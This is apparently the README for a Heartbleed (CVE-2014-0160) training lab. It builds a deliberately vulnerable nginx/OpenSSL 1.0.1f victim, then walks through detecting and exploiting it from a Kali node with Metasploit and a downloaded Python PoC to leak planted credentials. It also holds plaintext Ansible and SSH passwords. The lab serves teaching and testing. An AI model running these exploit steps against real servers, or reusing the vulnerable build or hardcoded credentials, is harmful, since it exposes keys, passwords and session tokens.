# Heartbleed (CVE-2014-0160) Lab

This lab compiles nginx from source against OpenSSL 1.0.1f — the version vulnerable to the Heartbleed bug. Heartbleed allows attackers to read up to 64KB of server process memory per request, potentially leaking TLS private keys, session tokens, passwords, and other sensitive data without leaving any trace in server logs.

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the "Model Editor" interface of the SPHERE platform, deploy the following model.
    ```python
    from mergexp import *

    net = Network('Heartbleed-Lab', addressing==ipv4, routing==static)

    attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
    victim = net.node('victim', image=='2404', proc.cores==4, memory.capacity==gb(4))

    link = net.connect([attacker, victim])

    link[attacker].socket.addrs = ip4('10.0.0.1/24')
    link[victim].socket.addrs   = ip4('10.0.0.2/24')

    experiment(net)
    ```

    > Note: 4 cores and 4 GB RAM are recommended for the victim to handle the source compilation of nginx and OpenSSL.

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. If the Ubuntu 24.04 root disk is not automatically expanded, run on the victim machine:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

### Deploy the Target Victim Machine

0. [Install Ansible](../setup_ansible/readme.md) on your XDC before proceeding.

1. The [`inventory.ini`](inventory.ini) is pre-configured to use SPHERE's DNS short name — no IP address lookup needed:
    ```ini
    [heartbleed_vm]
    heartbleed-target ansible_host=victim.infra ansible_user=lexuswang ansible_become_pass=lexuswang

    [heartbleed_vm:vars]
    ansible_python_interpreter=/usr/bin/python3
    ```
    `victim.infra` automatically resolves to the victim's infranet address via SPHERE DNS. Update `ansible_user` and `ansible_become_pass` if your SPHERE username differs from `lexuswang`.

2. Run the playbook. The playbook compiles nginx and OpenSSL from source, which takes approximately **5–10 minutes**:
    ```bash
    ansible-playbook -i inventory.ini heartbleed_target.yml --ask-become-pass
    ```

### Deploy the Attack Machine

Please refer to this [doc](../attacker_setup/readme.md) to set up the attack machine.

---

## Detailed Information about the Target System

**Service:** nginx 1.6.3 (compiled with OpenSSL 1.0.1f)

**Vulnerability:** CVE-2014-0160 (Heartbleed)

**OpenSSL Version:** 1.0.1f — patched in 1.0.1g

**CVSS Score:** 7.5 (High) — real-world impact is often considered Critical due to private key exposure

**Port:** 443 (HTTPS), 80 (redirects to HTTPS)

**Victim experiment network IP:** `10.0.0.2` (fixed in `merge_model.py`)

**HTTPS URL:** `https://10.0.0.2/`

**Service management:**
```bash
systemctl status nginx-heartbleed
/opt/nginx-heartbleed/sbin/nginx -v
```

### How the vulnerability works

The TLS Heartbeat extension (RFC 6520) allows a peer to send a "heartbeat request" with a payload and length. OpenSSL 1.0.1f does not validate that the declared length matches the actual payload length. An attacker can declare a payload length of 1 byte but request 65535 bytes back — causing OpenSSL to copy 65534 bytes of adjacent heap memory into the response. This memory may contain:

- TLS session private keys
- Recently processed HTTP request/response content
- Passwords submitted via POST (e.g., login forms)
- Cookie values and JWT tokens

The attack is completely passive — it requires no authentication and leaves no trace in server logs by default.

---

## Testing (from attacker machine)

All commands run on the Kali attacker (`10.0.0.1`).

### Step 1: Confirm HTTPS is running

```bash
curl -k https://10.0.0.2/
```

### Step 2: Detect Heartbleed

```bash
# Nmap NSE script (definitive detection)
nmap -sV --script ssl-heartbleed -p 443 10.0.0.2

# sslscan (also checks for Heartbleed)
sslscan 10.0.0.2:443

# sslyze
sslyze --heartbleed 10.0.0.2:443
```

Expected nmap output includes: `ssl-heartbleed: VULNERABLE` and `CVE-2014-0160`.

### Step 3: Exploit — Plant credentials in memory, then leak them

First, send an HTTPS POST request to plant credentials in the nginx process heap. The 404 response is expected (no backend handler exists) — what matters is that the POST data now resides in server memory:

```bash
curl -k -X POST https://10.0.0.2/login \
  -d "username=admin&password=SecretPassword123"
```

Then immediately run Heartbleed to capture the leaked memory:

**Method 1: Metasploit**
```bash
msfconsole -q -x "
use auxiliary/scanner/ssl/openssl_heartbleed;
set RHOSTS 10.0.0.2;
set RPORT 443;
set VERBOSE true;
run;
exit
"
```

Look for `admin`, `SecretPassword123`, or other HTTP request fragments in the dumped memory.

**Method 2: Python PoC script**
```bash
# Download a Heartbleed PoC
wget https://gist.githubusercontent.com/takeshixx/10107280/raw/heartbleed.py

# Dump memory (run multiple times to collect different 64KB chunks)
python3 heartbleed.py -p 443 10.0.0.2
```

Run the curl + exploit cycle several times — each Heartbleed request returns a different 64KB slice of server memory.

### Step 4: Analyze memory dump

Look for these patterns in the raw output:
- `username=admin&password=SecretPassword123` — POST form data
- `Authorization: Basic <base64>` — HTTP Basic auth credentials
- `Cookie: session=...` — session tokens
- `-----BEGIN` — PEM private key material
- HTTP request/response fragments from other concurrent connections

---

## Attack Chain

1. **Recon:** Nmap reveals HTTPS on port 443
2. **Detection:** `ssl-heartbleed` NSE script confirms vulnerability
3. **Plant Data:** Make login POST request to put credentials into server heap
4. **Exploit:** Run Heartbleed PoC to dump 64KB chunks of server memory
5. **Extract:** Parse output for credentials, tokens, and key material
6. **Access:** Use harvested data for authentication bypass or decryption

---

## Credentials

| Account | Password |
|---------|----------|
| SSH `webuser` | `password123` |
